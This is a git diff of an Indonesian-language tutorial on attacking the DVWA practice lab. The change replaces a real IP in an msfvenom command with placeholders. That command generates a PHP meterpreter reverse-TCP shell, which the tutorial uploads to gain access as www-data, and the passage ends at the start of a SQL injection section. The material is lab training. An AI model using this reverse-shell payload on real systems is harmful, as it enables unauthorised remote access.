@@ -298,7 +298,7 @@ http://<IP_Server>/DVWA/hackable/uploads/php-reverse-shell.php
 - Siapkan sebuah file gambar apa pun dengan ukuran file dibawah 100 kb
 - Buat file reverse shell PHP dengan tool msfvenom
 ```sh
-msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.100.5 lport=9999 -f raw
+msfvenom -p php/meterpreter/reverse_tcp lhost=IP_Attacker lport=nomor_port -f raw
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2045.JPG)
@@ -346,7 +346,7 @@ run
 
 - Metasploit berhasil masuk ke dalam sistem dengan user **www-data**
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2052.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2053.JPG)
 
 ## SQL Injection
 SQL Injection (SQLi) adalah celah keamanan web yang memungkinkan penyerang mengintruksi query yang dibuat aplikasi untuk melihat data yang biasanya tidak dapat mereka ambil, misalnya data pengguna lain atau data lain apapun yang dapat diakses oleh aplikasi itu sendiri
